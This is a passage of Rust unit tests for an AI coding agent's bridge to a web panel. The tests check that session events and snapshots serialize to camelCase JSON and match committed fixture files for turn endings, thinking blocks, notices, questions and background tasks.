        assert_eq!(parsed["message"], "failed to start session: no such file or directory");
    }

    #[test]
    fn serialize_snapshot_for_js_produces_camel_case_matching_the_ts_shape() {
        let mut projection = AgentSessionProjection::default();
        projection.apply(&AgentDomainEvent::SessionOpened {
            session_id: "verdandi-1".into(),
            provider_session_id: "claude-1".into(),
            model: "claude-sonnet-5".into(),
            cwd: "/tmp".into(),
        });
        projection.apply(&AgentDomainEvent::TurnStarted { turn_id: "t1".into() });
        projection.apply(&AgentDomainEvent::ToolCallStarted {
            turn_id: "t1".into(),
            tool_use_id: "toolu_1".into(),
            name: "Bash".into(),
            input: json!({"command": "echo hi"}),
        });
        projection.apply(&AgentDomainEvent::ToolCallCompleted {
            turn_id: "t1".into(),
            tool_use_id: "toolu_1".into(),
            content: json!("boom"),
            is_error: true,
        });
        projection.apply(&AgentDomainEvent::SessionUnavailable {
            reason: "provider process exited unexpectedly".into(),
        });

        let provider = agent::ProviderInfo {
            sidecar_version: "0.1.0".into(),
            claude_agent_sdk_version: "0.3.0".into(),
            actual_claude_code_version: "2.1.269".into(),
            protocol_major: 2,
            protocol_minor: 0,
            advertised_capabilities: vec!["handshake".into()],
            advertised_permission_modes: vec!["bypass".into()],
            event_buffer_policy: "bounded-1000".into(),
            build_description: Some("Verdandi checkout: /x @ eb70aa3 (via EITRI_VERDANDI_CHECKOUT)".into()),
            startup_diagnostics: vec!["claude CLI 2.1.269 is untested".into()],
            configuration_home: None,
        };
        let view = SnapshotView {
            backend: "sidecar",
            conversation_id: Some("conv-hash"),
            session_id: Some("verdandi-1"),
            provider_session_id: Some("claude-1".to_string()),
            capabilities: agent::ProviderCapabilities {
                resume: false,
                fork: false,
                interrupt: true,
                bypass_permission_mode: true,
                interactive_permission_mode: true,
                cli_auto_mode: false,
                steer: false,
                ..Default::default()
            },
            provider: Some(&provider),
            projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
            hidden_pending: None,
        };

        let json_str = serialize_snapshot_for_js(TabId(1), &view, None);
        let parsed: Value = serde_json::from_str(&json_str).unwrap();
        assert_eq!(parsed["kind"], "snapshot");
        assert_eq!(parsed["tab"], 1);
        assert_eq!(parsed["throughRevision"], 5);
        assert_eq!(parsed["state"]["backend"], "sidecar");
        assert_eq!(parsed["state"]["pendingPermissions"], json!([]));
        assert_eq!(parsed["state"]["status"]["kind"], "unavailable");
        assert_eq!(
            parsed["state"]["status"]["reason"],
            "provider process exited unexpectedly"
        );
        assert_eq!(parsed["state"]["toolCalls"][0]["toolUseId"], "toolu_1");
        assert_eq!(parsed["state"]["toolCalls"][0]["result"]["isError"], true);
        // The turn it started in, so a panel rehydrated from this snapshot can tell a call of the
        // active turn from one its ended turn abandoned, as the live reducer can (sw-panel-render-6).
        assert_eq!(parsed["state"]["toolCalls"][0]["turnId"], "t1");

        // The three identities reach the frontend as three separate fields. If any two of these
        // ever collapse to the same source, a consumer will eventually send Claude's id where
        // Verdandi's belongs and get SESSION_NOT_FOUND.
        assert_eq!(parsed["state"]["conversationId"], "conv-hash");
        assert_eq!(parsed["state"]["sessionId"], "verdandi-1");
        assert_eq!(parsed["state"]["providerSessionId"], "claude-1");

        assert_eq!(parsed["state"]["capabilities"]["interrupt"], true);
        assert_eq!(
            parsed["state"]["capabilities"]["resume"], false,
            "resume must not be advertised in this milestone"
        );
        assert_eq!(parsed["state"]["provider"]["claudeCodeVersion"], "2.1.269");
        assert_eq!(parsed["state"]["provider"]["protocol"], "2.0");
        assert!(parsed["state"]["provider"]["buildDescription"]
            .as_str()
            .unwrap()
            .contains("eb70aa3"));
        // Warnings only -- a list that is never empty cannot drive a "something is wrong" glyph.
        assert!(parsed["state"]["provider"]["startupDiagnostics"][0]
            .as_str()
            .unwrap()
            .contains("untested"));
    }

    /// `agent-ui/web/src/fixtures/turn-endings.json`: for each way a turn can end other than by
    /// completing, the events payload this side sends and the snapshot it sends after folding the
    /// same events, which the panel's tests render. Compared on every run; `EITRI_WRITE_FIXTURES=1`
    /// rewrites it.
    #[test]
    fn the_turn_endings_fixture_is_what_the_serializer_sends() {
        use agent::{TurnEndDetail, TurnOutcome};
        // Not recordings: only the 401 shape was ever recorded from the real CLI. Each case is the
        // shape the SDK's result types and the CLI's own classification of its terminal reasons
        // allow.
        let ended = |outcome: TurnOutcome,
                     is_error: bool,
                     result_text: &str,
                     reason: Option<&str>,
                     status: Option<u32>,
                     errors: &[&str]| {
            let errors: Vec<String> = errors.iter().map(ToString::to_string).collect();
            AgentDomainEvent::TurnCompleted {
                turn_id: "t1".into(),
                outcome,
                result_text: result_text.into(),
                stop_reason: None,
                usage: None,
                detail: TurnEndDetail::from_result(
                    outcome,
                    is_error,
                    result_text,
                    reason.map(str::to_string),
                    status,
                    &errors,
                ),
            }
        };
        let limits = |resets_at: i64| AgentDomainEvent::AccountLimits {
            used_percent: 100.0,
            window_minutes: Some(300),
            resets_at: Some(resets_at),
            plan: Some("pro".into()),
        };
        let cases: Vec<(&str, Vec<AgentDomainEvent>)> = vec![
            (
                "api_error",
                vec![ended(
                    TurnOutcome::Failed,
                    true,
                    "API Error: 529 {\"type\":\"error\",\"error\":{\"type\":\"overloaded_error\",\"message\":\"Overloaded\"}}",
                    Some("api_error"),
                    Some(529),
                    &[],
                )],
            ),
            (
                "rate_limited",
                vec![ended(
                    TurnOutcome::Failed,
                    true,
                    "API Error: 429 rate_limit_error",
                    Some("api_error"),
                    Some(429),
                    &[],
                )],
            ),
            (
                "context_full",
                vec![ended(
                    TurnOutcome::LimitReached,
                    true,
                    "Prompt is too long",
                    Some("blocking_limit"),
                    None,
                    &[],
                )],
            ),
            (
                "max_turns",
                vec![ended(
                    TurnOutcome::LimitReached,
                    true,
                    "",
                    Some("max_turns"),
                    None,
                    &["Reached maximum number of turns (3)"],
                )],
            ),
            (
                "hook_stopped",
                vec![ended(
                    TurnOutcome::Failed,
                    false,
                    "I stopped where the hook asked me to.",
                    Some("hook_stopped"),
                    None,
                    &[],
                )],
            ),
            (
                "interrupt",
                vec![ended(
                    TurnOutcome::Interrupted,
                    true,
                    "",
                    Some("aborted_streaming"),
                    None,
                    &["[ede_diagnostic] result_type=user last_content_type=n/a stop_reason=null"],
                )],
            ),
            (
                "cli_crash_closed",
                vec![
                    ended(TurnOutcome::Failed, true, "", None, None, &[]),
                    AgentDomainEvent::SessionClosed {
                        reason: "provider_failed".into(),
                    },
                ],
            ),
            (
                "stream_lost",
                vec![AgentDomainEvent::SessionUnavailable {
                    reason: "the sidecar's event stream ended without closing the session".into(),
                }],
            ),
            // An agent that reports its account's limits (Codex): the row keeps the reset time it
            // ended with, whatever a later report says.
            (
                "usage_limit",
                vec![
                    limits(1_900_000_000),
                    ended(
                        TurnOutcome::LimitReached,
                        true,
                        "You've hit your usage limit.",
                        Some("usage_limit"),
                        None,
                        &[],
                    ),
                    limits(1_900_086_400),
                ],
            ),
            // The report that explains the stop came just after it.
            (
                "usage_limit_reported_after",
                vec![
                    ended(
                        TurnOutcome::LimitReached,
                        true,
                        "You've hit your usage limit.",
                        Some("usage_limit"),
                        None,
                        &[],
                    ),
                    limits(1_900_000_000),
                ],
            ),
        ];

        let mut written_cases = Vec::new();
        for (name, ending) in cases {
            let mut events = vec![
                AgentDomainEvent::SessionOpened {
                    session_id: "sess-1".into(),
                    provider_session_id: "prov-1".into(),
                    model: "claude-sonnet-5".into(),
                    cwd: "/project".into(),
                },
                AgentDomainEvent::TurnStarted { turn_id: "t1".into() },
                AgentDomainEvent::UserPromptSubmitted {
                    text: "fix the parser".into(),
                },
                AgentDomainEvent::ContentDelta {
                    turn_id: "t1".into(),
                    kind: agent::ContentKind::Text,
                    text: "Looking at the parser".into(),
                },
            ];
            events.extend(ending);
            let mut projection = AgentSessionProjection::default();
            for event in &events {
                projection.apply(event);
            }
            let view = SnapshotView {
                backend: "sidecar",
                conversation_id: None,
                session_id: Some("sess-1"),
                provider_session_id: Some("prov-1".into()),
                capabilities: agent::ProviderCapabilities {
                    resume: true,
                    fork: false,
                    interrupt: true,
                    bypass_permission_mode: true,
                    interactive_permission_mode: true,
                    cli_auto_mode: false,
                    steer: false,
                    ..Default::default()
                },
                provider: None,
                projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
                hidden_pending: None,
            };
            let events_payload = serialize_events_for_js(TabId(1), 0, projection.last_revision, &events);
            let snapshot_payload = serialize_snapshot_for_js(TabId(1), &view, None);
            written_cases.push(json!({
                "name": name,
                "events": serde_json::from_str::<Value>(&events_payload).unwrap(),
                "snapshot": serde_json::from_str::<Value>(&snapshot_payload).unwrap(),
            }));
        }
        let fixture = json!({
            "writtenBy": "core/src/agent_bridge.rs, tests::the_turn_endings_fixture_is_what_the_serializer_sends \
                          -- compared on every run; EITRI_WRITE_FIXTURES=1 rewrites it",
            "cases": written_cases,
        });
        let path =
            std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../agent-ui/web/src/fixtures/turn-endings.json");
        let written = format!("{}\n", serde_json::to_string_pretty(&fixture).unwrap());
        let committed = std::fs::read_to_string(&path).ok();
        if committed.as_deref() == Some(written.as_str()) {
            return;
        }
        if std::env::var_os("EITRI_WRITE_FIXTURES").is_some_and(|v| v == "1") {
            std::fs::write(&path, &written).expect("write the turn endings fixture");
        } else {
            assert_eq!(
                committed.as_deref(),
                Some(written.as_str()),
                "the committed turn endings fixture is not what this test produces; if the change is \
                 intended, regenerate it with EITRI_WRITE_FIXTURES=1"
            );
        }
    }

    #[test]
    fn the_review_settings_envelope_carries_both_switches_by_name() {
        for (enabled, hint) in [(false, false), (true, false), (false, true), (true, true)] {
            let parsed: Value = serde_json::from_str(&serialize_review_settings_for_js(enabled, hint)).unwrap();
            assert_eq!(
                parsed,
                json!({ "kind": "review_settings", "enabled": enabled, "hint": hint })
            );
        }
    }

    #[test]
    fn the_display_envelope_names_the_thinking_level_in_the_words_init_lua_uses() {
        use crate::agent_prefs::ThinkingDisplay;
        for (display, word) in [
            (ThinkingDisplay::Collapsed, "collapsed"),
            (ThinkingDisplay::Preview, "preview"),
            (ThinkingDisplay::Expanded, "expanded"),
            (ThinkingDisplay::Hidden, "hidden"),
        ] {
            let parsed: Value = serde_json::from_str(&serialize_display_for_js(display)).unwrap();
            assert_eq!(parsed, json!({ "kind": "display", "thinking": word }));
        }
    }

    /// A projection in the middle of a thought sends the block and says it is still open, so a panel
    /// rebuilt from it neither splits the thought nor draws it as finished.
    #[test]
    fn a_snapshot_mid_thought_carries_the_block_and_says_it_is_open() {
        let state_of = |projection: &AgentSessionProjection| -> Value {
            let view = SnapshotView {
                backend: "sidecar",
                conversation_id: None,
                session_id: Some("sess-1"),
                provider_session_id: None,
                capabilities: agent::ProviderCapabilities::default(),
                provider: None,
                projection: crate::agent_backend::ProjectionRef::Borrowed(projection),
                hidden_pending: None,
            };
            let parsed: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
            parsed["state"].clone()
        };
        let mut projection = AgentSessionProjection::default();
        projection.apply(&AgentDomainEvent::TurnStarted { turn_id: "t1".into() });
        for chunk in ["First ", "the parser."] {
            projection.apply(&AgentDomainEvent::ContentDelta {
                turn_id: "t1".into(),
                kind: agent::ContentKind::Thinking,
                text: chunk.into(),
            });
        }
        let state = state_of(&projection);
        assert_eq!(
            state["thinking"],
            json!([{ "seq": 1, "turnId": "t1", "text": "First the parser." }])
        );
        assert_eq!(state["thinkingOpen"], true);
        // Thinking is not a reply: nothing of it is in the transcript.
        assert_eq!(state["transcript"], json!([]));

        projection.apply(&AgentDomainEvent::ContentDelta {
            turn_id: "t1".into(),
            kind: agent::ContentKind::Text,
            text: "Done.".into(),
        });
        let state = state_of(&projection);
        assert_eq!(state["thinkingOpen"], false);
        assert_eq!(state["thinking"][0]["text"], "First the parser.");
    }

    /// `agent-ui/web/src/fixtures/thinking.json`: for each way thinking arrives, the events payload this
    /// side sends, the snapshot after a prefix of them (`split`), and the snapshot after all of them. The
    /// panel's reducer must fold the events to what the last snapshot carries, from nothing and from the
    /// middle one. Compared on every run; `EITRI_WRITE_FIXTURES=1` rewrites it.
    #[test]
    fn the_thinking_fixture_is_what_the_serializer_sends() {
        use agent::{ContentKind, TurnEndDetail, TurnOutcome};
        let thought = |text: &str| AgentDomainEvent::ContentDelta {
            turn_id: "t1".into(),
            kind: ContentKind::Thinking,
            text: text.into(),
        };
        let said = |text: &str| AgentDomainEvent::ContentDelta {
            turn_id: "t1".into(),
            kind: ContentKind::Text,
            text: text.into(),
        };
        let call = |id: &str| AgentDomainEvent::ToolCallStarted {
            turn_id: "t1".into(),
            tool_use_id: id.into(),
            name: "Read".into(),
            input: json!({ "file_path": "/project/src/parser.rs" }),
        };
        let done = |id: &str| AgentDomainEvent::ToolCallCompleted {
            turn_id: "t1".into(),
            tool_use_id: id.into(),
            content: json!("fn parse() {}"),
            is_error: false,
        };
        let ended = AgentDomainEvent::TurnCompleted {
            turn_id: "t1".into(),
            outcome: TurnOutcome::Completed,
            result_text: "Fixed.".into(),
            stop_reason: None,
            usage: None,
            detail: TurnEndDetail::default(),
        };
        // (name, events after the turn starts, how many of ALL the events the middle snapshot folds)
        let cases: Vec<(&str, Vec<AgentDomainEvent>, usize)> = vec![
            // Thinking between calls and before the reply, streamed in pieces; the middle snapshot lands
            // inside the second thought.
            (
                "interleaved",
                vec![
                    thought("Read the "),
                    thought("parser first."),
                    call("toolu_1"),
                    done("toolu_1"),
                    thought("The loop "),
                    thought("never ends.\nFix the bound."),
                    said("Fixed."),
                    ended,
                ],
                7,
            ),
            // The turn is still thinking when the middle snapshot is taken, and goes on after it.
            (
                "open_at_the_snapshot",
                vec![thought("One"), thought(" two"), thought(" three")],
                3,
            ),
            // A delta with no text is no block and ends none.
            (
                "empty_delta",
                vec![thought(""), thought("a"), thought(""), thought("b"), said("ok")],
                4,
            ),
            // A thought arriving in the middle of a reply does not cut the reply in two.
            (
                "thought_inside_a_reply",
                vec![said("Half "), thought("hmm"), said("and half."), thought("after")],
                4,
            ),
        ];

        let view_of = |projection: &AgentSessionProjection| -> Value {
            let view = SnapshotView {
                backend: "sidecar",
                conversation_id: None,
                session_id: Some("sess-1"),
                provider_session_id: Some("prov-1".into()),
                capabilities: agent::ProviderCapabilities::default(),
                provider: None,
                projection: crate::agent_backend::ProjectionRef::Borrowed(projection),
                hidden_pending: None,
            };
            serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap()
        };
        let mut written_cases = Vec::new();
        for (name, rest, split) in cases {
            let mut events = vec![
                AgentDomainEvent::UserPromptSubmitted {
                    text: "fix the parser".into(),
                },
                AgentDomainEvent::TurnStarted { turn_id: "t1".into() },
            ];
            events.extend(rest);
            assert!(split <= events.len(), "{name}");
            let mut projection = AgentSessionProjection::default();
            let mut middle = Value::Null;
            for (at, event) in events.iter().enumerate() {
                if at == split {
                    middle = view_of(&projection);
                }
                projection.apply(event);
            }
            if split == events.len() {
                middle = view_of(&projection);
            }
            let events_payload = serialize_events_for_js(TabId(1), 0, projection.last_revision, &events);
            written_cases.push(json!({
                "name": name,
                "split": split,
                "events": serde_json::from_str::<Value>(&events_payload).unwrap(),
                "middle": middle,
                "snapshot": view_of(&projection),
            }));
        }
        let fixture = json!({
            "writtenBy": "core/src/agent_bridge.rs, tests::the_thinking_fixture_is_what_the_serializer_sends \
                          -- compared on every run; EITRI_WRITE_FIXTURES=1 rewrites it",
            "cases": written_cases,
        });
        let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../agent-ui/web/src/fixtures/thinking.json");
        let written = format!("{}\n", serde_json::to_string_pretty(&fixture).unwrap());
        let committed = std::fs::read_to_string(&path).ok();
        if committed.as_deref() == Some(written.as_str()) {
            return;
        }
        if std::env::var_os("EITRI_WRITE_FIXTURES").is_some_and(|v| v == "1") {
            std::fs::write(&path, &written).expect("write the thinking fixture");
        } else {
            assert_eq!(
                committed.as_deref(),
                Some(written.as_str()),
                "the committed thinking fixture is not what this test produces; if the change is \
                 intended, regenerate it with EITRI_WRITE_FIXTURES=1"
            );
        }
    }

    #[test]
    fn session_notices_events_and_snapshot_are_twins() {
        let path =
            std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../agent-ui/web/src/fixtures/session-notices.json");
        let mut fixture: Value = serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
        let original = fixture.clone();
        for case in fixture["cases"].as_array_mut().unwrap() {
            let events: Vec<AgentDomainEvent> = serde_json::from_value(case["domain_events"].clone()).unwrap();
            let mut projection = AgentSessionProjection::default();
            for event in &events {
                projection.apply(event);
            }
            // History A keeps rows, independently of live activity and band state.
            let stored = agent::history::StoredHistory::from_parts(
                "notices".into(),
                "session".into(),
                agent::history::HistoryParts {
                    notices: projection.notices.clone(),
                    ..Default::default()
                },
            );
            let restored: agent::history::StoredHistory =
                serde_json::from_str(&serde_json::to_string(&stored).unwrap()).unwrap();
            assert_eq!(restored.notices, projection.notices);
            let mut refolded = AgentSessionProjection::default();
            for record in restored.notices {
                refolded.apply(&AgentDomainEvent::SessionNotice {
                    kind: record.kind,
                    level: record.level,
                    content: record.content,
                    scalars: record.scalars,
                    task_id: record.task_id,
                    tool_use_id: record.tool_use_id,
                    task_status: record.task_status,
                });
            }
            assert_eq!(refolded.notices.len(), projection.notices.len());
            for (restored, original) in refolded.notices.iter().zip(&projection.notices) {
                assert_eq!(restored.kind, original.kind);
                assert_eq!(restored.content, original.content);
                assert_eq!(restored.scalars, original.scalars);
            }
            let view = SnapshotView {
                backend: "sidecar",
                conversation_id: None,
                session_id: None,
                provider_session_id: None,
                capabilities: agent::ProviderCapabilities::default(),
                provider: None,
                projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
                hidden_pending: None,
            };
            case["snapshot"] = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
            case["events"] =
                serde_json::from_str(&serialize_events_for_js(TabId(1), 0, projection.last_revision, &events)).unwrap();
        }
        if std::env::var_os("EITRI_WRITE_FIXTURES").is_some_and(|v| v == "1") {
            std::fs::write(path, format!("{}\n", serde_json::to_string_pretty(&fixture).unwrap())).unwrap();
        } else {
            assert_eq!(original, fixture);
        }
    }

    /// `fixtures/conversation-reset.json`: each case's events folded here, the events payload this side
    /// sends for them and the snapshot it sends after them, which the panel's reducer must agree with
    /// (`reducer.test.ts`). The snapshot is taken as it is once the new conversation's session opened,
    /// with that session's id. `EITRI_WRITE_FIXTURES=1` rewrites the generated parts.
    #[test]
    fn conversation_reset_events_and_snapshot_are_twins() {
        let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../agent-ui/web/src/fixtures/conversation-reset.json");
        let mut fixture: Value = serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
        let original = fixture.clone();
        for case in fixture["cases"].as_array_mut().unwrap() {
            let events: Vec<AgentDomainEvent> = serde_json::from_value(case["domain_events"].clone()).unwrap();
            let mut projection = AgentSessionProjection::default();
            for event in &events {
                projection.apply(event);
            }
            let view = SnapshotView {
                backend: "sidecar",
                conversation_id: None,
                session_id: projection.session_id.as_deref(),
                provider_session_id: projection.provider_session_id.clone(),
                capabilities: agent::ProviderCapabilities::default(),
                provider: None,
                projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
                hidden_pending: None,
            };
            case["snapshot"] = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
            case["events"] =
                serde_json::from_str(&serialize_events_for_js(TabId(1), 0, projection.last_revision, &events)).unwrap();
        }
        if std::env::var_os("EITRI_WRITE_FIXTURES").is_some_and(|v| v == "1") {
            std::fs::write(path, format!("{}\n", serde_json::to_string_pretty(&fixture).unwrap())).unwrap();
        } else {
            assert_eq!(original, fixture);
        }
    }

    #[test]
    fn questions_fixture_matches_events_and_canonical_snapshots() {
        let fixture: Value =
            serde_json::from_str(include_str!("../../agent-ui/web/src/fixtures/questions.json")).unwrap();
        for case in fixture["cases"].as_array().unwrap() {
            let mut projection = AgentSessionProjection::default();
            for step in case["steps"].as_array().unwrap() {
                let action = &step["action"];
                if let Some(event) = action.get("event") {
                    let event: AgentDomainEvent = serde_json::from_value(event.clone()).unwrap();
                    let payload: Value = serde_json::from_str(&serialize_events_for_js(
                        TabId(1),
                        projection.last_revision,
                        projection.last_revision + 1,
                        std::slice::from_ref(&event),
                    ))
                    .unwrap();
                    assert_eq!(payload["events"][0], action["event"]);
                    projection.apply(&event);
                } else {
                    let id = action["interactionId"].as_str().unwrap();
                    let changed = match action["send"].as_str().unwrap() {
                        "answering" => projection.mark_question_answering(id),
                        "failed" => projection.question_send_failed(id),
                        other => panic!("unknown send action: {other}"),
                    };
                    assert_eq!(changed, action["changed"].as_bool().unwrap());
                }
                let view = SnapshotView {
                    backend: "sidecar",
                    conversation_id: None,
                    session_id: None,
                    provider_session_id: None,
                    capabilities: agent::ProviderCapabilities::default(),
                    provider: None,
                    projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
                    hidden_pending: None,
                };
                let canonical: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
                assert_eq!(canonical["throughRevision"], step["throughRevision"]);
                assert_eq!(
                    canonical["state"]["questions"], step["snapshot"]["questions"],
                    "{}",
                    case["name"]
                );
                assert_eq!(canonical["state"]["activeTurnId"], step["snapshot"]["activeTurnId"]);
                assert_eq!(
                    serde_json::to_value(
                        projection
                            .waiting_questions()
                            .map(|q| &q.interaction_id)
                            .collect::<Vec<_>>()
                    )
                    .unwrap(),
                    step["waitingIds"]
                );
            }
        }
    }

    #[test]
    fn background_tasks_events_and_snapshots_are_twins() {
        let path =
            std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../agent-ui/web/src/fixtures/background-tasks.json");
        let mut fixture: Value = serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
        let write = std::env::var_os("EITRI_WRITE_FIXTURES").is_some_and(|v| v == "1");
        for case in fixture["cases"].as_array_mut().unwrap() {
            let name = case["name"].as_str().unwrap().to_owned();
            let source: Vec<AgentDomainEvent> = serde_json::from_value(case["domain_events"].clone()).unwrap();
            let mut projection = AgentSessionProjection::default();
            let mut delivered = Vec::new();
            let mut snapshots = Vec::new();
            let mut batches = Vec::new();
            for (index, event) in source.iter().enumerate() {
                let from = projection.last_revision;
                let old_count = projection.background_tasks.running();
                let derived = projection.apply_with_derived(event);
                let count = projection.background_tasks.running();
                assert_eq!(
                    count as u64,
                    case["expected_running"][index].as_u64().unwrap(),
                    "{name} event {index}"
                );
                assert_eq!(projection.background_calls, count, "{name} event {index}");
                assert_eq!(derived.len(), usize::from(old_count != count), "{name} event {index}");
                let mut batch = vec![event.clone()];
                batch.extend(derived);
                delivered.extend(batch.iter().cloned());
                let view = SnapshotView {
                    backend: "sidecar",
                    conversation_id: None,
                    session_id: None,
                    provider_session_id: None,
                    capabilities: agent::ProviderCapabilities::default(),
                    provider: None,
                    projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
                    hidden_pending: None,
                };
                let snapshot: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
                snapshots.push(snapshot);
                let payload: Value = serde_json::from_str(&serialize_events_for_js(
                    TabId(1),
                    from,
                    projection.last_revision,
                    &batch,
                ))
                .unwrap();
                batches.push(payload);
            }
            assert_eq!(
                projection.notices.len() as u64,
                case["expected_notice_count"].as_u64().unwrap(),
                "{name}"
            );
            let rows = serde_json::to_value(&projection.background_tasks.rows).unwrap();
            let expected_rows = case["expected_rows"].as_array().unwrap();
            assert_eq!(rows.as_array().unwrap().len(), expected_rows.len(), "{name}");
            for (row, expected) in rows.as_array().unwrap().iter().zip(expected_rows) {
                for (key, value) in expected.as_object().unwrap() {
                    assert_eq!(&row[key], value, "{name} {key}");
                }
            }
            let payload: Value = serde_json::from_str(&serialize_events_for_js(
                TabId(1),
                0,
                projection.last_revision,
                &delivered,
            ))
            .unwrap();
            if write {
                case["events"] = payload;
                case["batches"] = json!(batches);
                case["snapshots"] = json!(snapshots);
            } else {
                assert_eq!(case["events"], payload, "{name}");
                assert_eq!(case["batches"], json!(batches), "{name}");
                assert_eq!(case["snapshots"], json!(snapshots), "{name}");
            }
        }
        if write {
            std::fs::write(path, format!("{}\n", serde_json::to_string_pretty(&fixture).unwrap())).unwrap();
        }
    }

    #[test]
    fn subagent_frames_events_and_snapshots_are_twins() {
        let path =
            std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../agent-ui/web/src/fixtures/subagent-frames.json");
        let mut fixture: Value = serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
        let write = std::env::var_os("EITRI_WRITE_FIXTURES").is_some_and(|v| v == "1");
        for case in fixture["cases"].as_array_mut().unwrap() {
            let events: Vec<AgentDomainEvent> = serde_json::from_value(case["events"].clone()).unwrap();
            let mut projection = AgentSessionProjection::default();
            for event in &events {
                projection.apply(event);
            }
            let view = SnapshotView {
                backend: "sidecar",
                conversation_id: None,
                session_id: None,
                provider_session_id: None,
                capabilities: agent::ProviderCapabilities::default(),
                provider: None,
                projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
                hidden_pending: None,
            };
            let snapshot: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
            if write {
                case["snapshot"] = snapshot;
            } else {
                assert_eq!(case["snapshot"], snapshot, "{}", case["name"]);
            }
        }
        if write {
            std::fs::write(path, format!("{}\n", serde_json::to_string_pretty(&fixture).unwrap())).unwrap();
        }
    }

    #[test]
    fn protocol_322_events_and_snapshot_are_twins() {
        let path =
            std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../agent-ui/web/src/fixtures/protocol-322.json");
        let committed = std::fs::read_to_string(&path).unwrap();
        let fixture: Value = serde_json::from_str(&committed).unwrap();
        let events: Vec<AgentDomainEvent> = serde_json::from_value(fixture["domain_events"].clone()).unwrap();
        let mut projection = AgentSessionProjection::default();
        for event in &events {
            projection.apply(event);
        }
        let view = SnapshotView {
            backend: "sidecar",
            conversation_id: None,
            session_id: None,
            provider_session_id: None,
            capabilities: agent::ProviderCapabilities::default(),
            provider: None,
            projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
            hidden_pending: None,
        };
        let snapshot: Value = serde_json::from_str(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap();
        let payload: Value =
            serde_json::from_str(&serialize_events_for_js(TabId(1), 0, projection.last_revision, &events)).unwrap();
        let expected = json!({ "domain_events": fixture["domain_events"], "events": payload, "snapshot": snapshot });
        if std::env::var_os("EITRI_WRITE_FIXTURES").is_some_and(|v| v == "1") {
            std::fs::write(path, format!("{}\n", serde_json::to_string_pretty(&expected).unwrap())).unwrap();
        } else {
            assert_eq!(fixture, expected);
        }
    }

    /// `agent-ui/web/src/fixtures/claude-scripted-<scenario>.json`: the events of a scripted Claude scenario, as
    /// the harness records them with every string the CLI wrote reduced to a digest (`domain_events`), the
    /// events payload this side sends for them and the snapshot it sends after folding them. The panel's
    /// reducer must fold the payload to what the snapshot carries (`claudeScripted.test.ts`). The harness
    /// writes `domain_events` and `scenario`; this test adds the rest. Compared on every run;
    /// `EITRI_WRITE_FIXTURES=1` rewrites each file.
    #[test]
    fn the_claude_scripted_twins_are_what_the_serializer_sends() {
        let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../agent-ui/web/src/fixtures");
        let mut twins: Vec<std::path::PathBuf> = std::fs::read_dir(&dir)
            .expect("the fixtures directory")
            .flatten()
            .map(|entry| entry.path())
            .filter(|path| {
                path.file_name()
                    .and_then(|name| name.to_str())
                    .is_some_and(|name| name.starts_with("claude-scripted-") && name.ends_with(".json"))
            })
            .collect();
        twins.sort();
        assert!(!twins.is_empty(), "no claude-scripted twin under {}", dir.display());
        let write = std::env::var_os("EITRI_WRITE_FIXTURES").is_some_and(|v| v == "1");
        let mut stale = Vec::new();
        for path in twins {
            let committed = std::fs::read_to_string(&path).expect("a twin");
            let twin: Value = serde_json::from_str(&committed).unwrap_or_else(|e| panic!("{}: {e}", path.display()));
            let source = twin["domain_events"]
                .as_array()
                .unwrap_or_else(|| panic!("{}: no domain_events", path.display()));
            let events: Vec<AgentDomainEvent> = source
                .iter()
                .enumerate()
                .map(|(n, event)| {
                    serde_json::from_value(event.clone())
                        .unwrap_or_else(|e| panic!("{}: domain event {n} does not parse: {e}", path.display()))
                })
                .collect();
            let mut projection = AgentSessionProjection::default();
            for event in &events {
                projection.apply(event);
            }
            let snapshot = {
                let view = SnapshotView {
                    backend: "sidecar",
                    conversation_id: None,
                    session_id: Some("sess-1"),
                    provider_session_id: Some("prov-1".into()),
                    capabilities: agent::ProviderCapabilities::default(),
                    provider: None,
                    projection: crate::agent_backend::ProjectionRef::Borrowed(&projection),
                    hidden_pending: None,
                };
                serde_json::from_str::<Value>(&serialize_snapshot_for_js(TabId(1), &view, None)).unwrap()
            };
            let payload =
                serde_json::from_str::<Value>(&serialize_events_for_js(TabId(1), 0, projection.last_revision, &events))
                    .unwrap();
            let fixture = json!({
                "writtenBy": "core/src/agent_bridge.rs, tests::the_claude_scripted_twins_are_what_the_serializer_sends \
                              -- compared on every run; EITRI_WRITE_FIXTURES=1 rewrites it",
                "scenario": twin["scenario"],
                "domain_events": twin["domain_events"],
                "events": payload,
                "snapshot": snapshot,
            });
            let written = format!("{}\n", serde_json::to_string_pretty(&fixture).unwrap());
            if written == committed {
                continue;
            }
            if write {
                std::fs::write(&path, &written).expect("write a twin");
            } else {
                stale.push(path.display().to_string());
            }
        }
        assert!(
            stale.is_empty(),
            "these twins are not what this test produces; if the change is intended, regenerate them with \
             EITRI_WRITE_FIXTURES=1: {stale:?}"
        );
    }

